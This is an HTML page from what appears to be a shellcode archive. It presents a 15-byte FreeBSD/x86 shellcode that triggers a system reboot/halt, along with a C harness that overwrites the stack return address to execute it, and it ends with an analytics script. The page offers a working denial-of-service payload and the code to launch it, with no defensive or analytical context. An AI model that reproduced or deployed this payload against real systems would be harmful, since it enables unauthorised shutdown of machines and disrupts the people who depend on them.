<html><head><title>FreeBSD/x86 - reboot() - 15 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>

/*

FreeBSD reboot() shellcode

This will halt a system, which takes it offline until someone reboots it.

Written by zillion (at safemode.org

*/

char shellcode[] =
        &quot;\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80&quot;;

int main()
{

  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
